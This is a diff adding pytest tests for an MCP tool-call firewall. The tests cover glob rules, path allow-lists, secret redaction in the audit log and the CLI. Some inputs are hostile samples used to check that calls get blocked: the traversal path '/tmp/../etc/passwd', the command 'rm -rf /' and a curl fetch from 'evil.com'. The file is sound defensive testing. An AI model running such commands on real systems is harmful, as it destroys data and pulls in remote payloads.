@@ -2,6 +2,7 @@
 
 import json
 import pytest
+from mcpfw.logger import AuditLogger
 from mcpfw.parser import (
     MCPMessage,
     MessageDirection,
@@ -166,6 +167,11 @@ class TestPolicyEvaluation:
         assert verdict.is_blocked
         assert "outside allowed paths" in verdict.reason
 
+        # Path traversal should not bypass allow_paths
+        msg = self._make_tool_call("read_file", {"path": "/tmp/../etc/passwd"})
+        verdict = policy.evaluate_tool_call("test-server", msg)
+        assert verdict.is_blocked
+
     def test_block_pattern(self):
         policy = Policy(
             server_policies=[
@@ -281,3 +287,294 @@ servers:
         assert policy.server_policies[0].blocked_tools == ["write_file"]
         assert len(policy.server_policies[0].tool_rules) == 1
         assert policy.server_policies[0].tool_rules[0].severity == Severity.CRITICAL
+
+    def test_invalid_action_raises_descriptive_error(self, tmp_path):
+        policy_file = tmp_path / "bad.yaml"
+        policy_file.write_text("version: 1\ndefault_action: blokk\n")
+        with pytest.raises(ValueError, match="Invalid action 'blokk'"):
+            load_policy(policy_file)
+
+    def test_invalid_severity_raises_descriptive_error(self, tmp_path):
+        policy_file = tmp_path / "bad.yaml"
+        policy_file.write_text("""
+version: 1
+servers:
+  - server: s
+    tool_rules:
+      - name: r
+        severity: ultra_critical
+""")
+        with pytest.raises(ValueError, match="Invalid severity 'ultra_critical'"):
+            load_policy(policy_file)
+
+
+# --- Glob matching tests ---
+
+
+class TestToolMatches:
+    def _policy_with_rule(self, tools: list[str], action: Action = Action.BLOCK) -> Policy:
+        return Policy(
+            server_policies=[
+                ServerPolicy(
+                    server="s",
+                    tool_rules=[ToolRule(name="r", tools=tools, action=action)],
+                )
+            ]
+        )
+
+    def _call(self, policy: Policy, tool_name: str) -> Verdict:
+        raw = json.dumps({
+            "method": "tools/call",
+            "params": {"name": tool_name, "arguments": {}},
+            "jsonrpc": "2.0",
+            "id": 1,
+        })
+        msg = parse_message(raw, MessageDirection.CLIENT_TO_SERVER)
+        return policy.evaluate_tool_call("s", msg)
+
+    def test_exact_match(self):
+        policy = self._policy_with_rule(["read_file"])
+        assert self._call(policy, "read_file").is_blocked
+        assert not self._call(policy, "write_file").is_blocked
+
+    def test_wildcard_all(self):
+        policy = self._policy_with_rule(["*"])
+        assert self._call(policy, "any_tool").is_blocked
+
+    def test_prefix_glob(self):
+        policy = self._policy_with_rule(["write_*"])
+        assert self._call(policy, "write_file").is_blocked
+        assert self._call(policy, "write_secret").is_blocked
+        assert not self._call(policy, "read_file").is_blocked
+
+    def test_suffix_glob(self):
+        policy = self._policy_with_rule(["*_dangerous"])
+        assert self._call(policy, "exec_dangerous").is_blocked
+        assert not self._call(policy, "exec_dangerous_extra").is_blocked
+
+    def test_glob_does_not_match_unrelated(self):
+        policy = self._policy_with_rule(["write_*"])
+        assert not self._call(policy, "superwrite_file").is_blocked
+
+
+# --- allow_paths with alternate key names ---
+
+
+class TestAllowPathsKeys:
+    def _make_msg(self, tool: str, args: dict) -> MCPMessage:
+        raw = json.dumps({
+            "method": "tools/call",
+            "params": {"name": tool, "arguments": args},
+            "jsonrpc": "2.0",
+            "id": 1,
+        })
+        return parse_message(raw, MessageDirection.CLIENT_TO_SERVER)
+
+    def _policy(self) -> Policy:
+        return Policy(
+            server_policies=[
+                ServerPolicy(
+                    server="s",
+                    tool_rules=[
+                        ToolRule(name="r", tools=["*"], allow_paths=["/tmp/"])
+                    ],
+                )
+            ]
+        )
+
+    def test_path_key_allowed(self):
+        verdict = self._policy().evaluate_tool_call("s", self._make_msg("t", {"path": "/tmp/file.txt"}))
+        assert not verdict.is_blocked
+
+    def test_filepath_key_allowed(self):
+        verdict = self._policy().evaluate_tool_call("s", self._make_msg("t", {"filepath": "/tmp/file.txt"}))
+        assert not verdict.is_blocked
+
+    def test_filepath_key_blocked(self):
+        verdict = self._policy().evaluate_tool_call("s", self._make_msg("t", {"filepath": "/etc/passwd"}))
+        assert verdict.is_blocked
+
+    def test_no_path_key_fails_closed(self):
+        verdict = self._policy().evaluate_tool_call("s", self._make_msg("t", {"content": "hello"}))
+        assert verdict.is_blocked
+        assert "No path argument" in verdict.reason
+
+
+# --- Nested argument flattening ---
+
+
+class TestFlattenArguments:
+    def _policy_with_block_pattern(self, pattern: str) -> Policy:
+        return Policy(
+            server_policies=[
+                ServerPolicy(
+                    server="s",
+                    tool_rules=[
+                        ToolRule(name="r", tools=["*"], block_patterns=[pattern])
+                    ],
+                )
+            ]
+        )
+
+    def _call(self, policy: Policy, args: dict) -> Verdict:
+        raw = json.dumps({
+            "method": "tools/call",
+            "params": {"name": "exec", "arguments": args},
+            "jsonrpc": "2.0",
+            "id": 1,
+        })
+        msg = parse_message(raw, MessageDirection.CLIENT_TO_SERVER)
+        return policy.evaluate_tool_call("s", msg)
+
+    def test_top_level_value_matched(self):
+        policy = self._policy_with_block_pattern(r"rm -rf")
+        verdict = self._call(policy, {"cmd": "rm -rf /"})
+        assert verdict.is_blocked
+
+    def test_nested_dict_value_matched(self):
+        policy = self._policy_with_block_pattern(r"rm -rf")
+        verdict = self._call(policy, {"command": {"shell": "bash", "args": ["rm -rf /"]}})
+        assert verdict.is_blocked
+
+    def test_nested_list_value_matched(self):
+        policy = self._policy_with_block_pattern(r"evil\.com")
+        verdict = self._call(policy, {"steps": ["curl", "http://evil.com/payload"]})
+        assert verdict.is_blocked
+
+    def test_benign_nested_not_matched(self):
+        policy = self._policy_with_block_pattern(r"rm -rf")
+        verdict = self._call(policy, {"command": {"shell": "bash", "args": ["ls -la"]}})
+        assert not verdict.is_blocked
+
+
+# --- Audit logger tests ---
+
+
+class TestAuditLogger:
+    def _make_tool_call_msg(self, tool_name: str, arguments: dict) -> MCPMessage:
+        raw = json.dumps({
+            "method": "tools/call",
+            "params": {"name": tool_name, "arguments": arguments},
+            "jsonrpc": "2.0",
+            "id": 1,
+        })
+        return parse_message(raw, MessageDirection.CLIENT_TO_SERVER)
+
+    def test_jsonl_format(self, tmp_path):
+        log_file = tmp_path / "audit.jsonl"
+        logger = AuditLogger(log_path=log_file, stderr_summary=False)
+        msg = self._make_tool_call_msg("read_file", {"path": "/tmp/test.txt"})
+        verdict = Verdict(action=Action.ALLOW)
+        logger.log_tool_call("test-server", msg, verdict)
+        logger.close()
+        lines = log_file.read_text().splitlines()
+        assert len(lines) == 1
+        entry = json.loads(lines[0])
+        assert entry["event"] == "tool_call"
+        assert entry["tool"] == "read_file"
+        assert entry["verdict"] == "allow"
+        assert entry["server"] == "test-server"
+
+    def test_secret_argument_redacted(self, tmp_path):
+        log_file = tmp_path / "audit.jsonl"
+        logger = AuditLogger(log_path=log_file, stderr_summary=False)
+        msg = self._make_tool_call_msg("set_credentials", {"api_key": "sk-supersecret"})
+        verdict = Verdict(action=Action.ALLOW)
+        logger.log_tool_call("s", msg, verdict)
+        logger.close()
+        entry = json.loads(log_file.read_text().splitlines()[0])
+        assert entry["arguments"]["api_key"] == "<redacted>"
+
+    def test_long_argument_truncated(self, tmp_path):
+        log_file = tmp_path / "audit.jsonl"
+        logger = AuditLogger(log_path=log_file, stderr_summary=False)
+        big_value = "x" * 1000
+        msg = self._make_tool_call_msg("upload", {"content": big_value})
+        verdict = Verdict(action=Action.ALLOW)
+        logger.log_tool_call("s", msg, verdict)
+        logger.close()
+        entry = json.loads(log_file.read_text().splitlines()[0])
+        assert len(entry["arguments"]["content"]) < 400
+        assert "truncated" in entry["arguments"]["content"]
+
+    def test_stats_counters(self, tmp_path):
+        log_file = tmp_path / "audit.jsonl"
+        logger = AuditLogger(log_path=log_file, stderr_summary=False)
+        msg = self._make_tool_call_msg("read_file", {"path": "/tmp/x"})
+        logger.log_tool_call("s", msg, Verdict(action=Action.ALLOW))
+        logger.log_tool_call("s", msg, Verdict(action=Action.BLOCK))
+        assert logger._stats["total"] == 2
+        assert logger._stats["allowed"] == 1
+        assert logger._stats["blocked"] == 1
+        logger.close()
+
+    def test_clean_response_not_logged(self, tmp_path):
+        log_file = tmp_path / "audit.jsonl"
+        logger = AuditLogger(log_path=log_file, stderr_summary=False)
+        raw = json.dumps({
+            "jsonrpc": "2.0", "id": 1,
+            "result": {"content": [{"type": "text", "text": "hello"}]},
+        })
+        msg = parse_message(raw, MessageDirection.SERVER_TO_CLIENT)
+        logger.log_response_scan("s", msg, Verdict(action=Action.ALLOW))
+        logger.close()
+        assert log_file.read_text() == ""
+
+
+# --- CLI tests ---
+
+
+class TestCLI:
+    def test_init_creates_policy_file(self, tmp_path):
+        import subprocess, sys
+        policy_path = tmp_path / "policy.yaml"
+        result = subprocess.run(
+            [sys.executable, "-m", "mcpfw.cli", "init", "--path", str(policy_path)],
+            capture_output=True, text=True,
+        )
+        assert result.returncode == 0
+        assert policy_path.exists()
+        content = policy_path.read_text()
+        assert "version: 1" in content
+        assert "default_action: allow" in content
+
+    def test_init_refuses_to_overwrite(self, tmp_path):
+        import subprocess, sys
+        policy_path = tmp_path / "policy.yaml"
+        policy_path.write_text("existing content")
+        result = subprocess.run(
+            [sys.executable, "-m", "mcpfw.cli", "init", "--path", str(policy_path)],
+            capture_output=True, text=True,
+        )
+        assert result.returncode == 1
+        assert policy_path.read_text() == "existing content"
+
+    def test_verify_valid_policy(self, tmp_path):
+        import subprocess, sys
+        policy_path = tmp_path / "policy.yaml"
+        policy_path.write_text("version: 1\ndefault_action: allow\n")
+        result = subprocess.run(
+            [sys.executable, "-m", "mcpfw.cli", "verify", str(policy_path)],
+            capture_output=True, text=True,
+        )
+        assert result.returncode == 0
+        assert "valid" in result.stderr
+
+    def test_verify_invalid_policy(self, tmp_path):
+        import subprocess, sys
+        policy_path = tmp_path / "policy.yaml"
+        policy_path.write_text("version: 1\ndefault_action: blokk\n")
+        result = subprocess.run(
+            [sys.executable, "-m", "mcpfw.cli", "verify", str(policy_path)],
+            capture_output=True, text=True,
+        )
+        assert result.returncode == 1
+        assert "blokk" in result.stderr
+
+    def test_verify_missing_file(self, tmp_path):
+        import subprocess, sys
+        result = subprocess.run(
+            [sys.executable, "-m", "mcpfw.cli", "verify", str(tmp_path / "ghost.yaml")],
+            capture_output=True, text=True,
+        )
+        assert result.returncode == 1
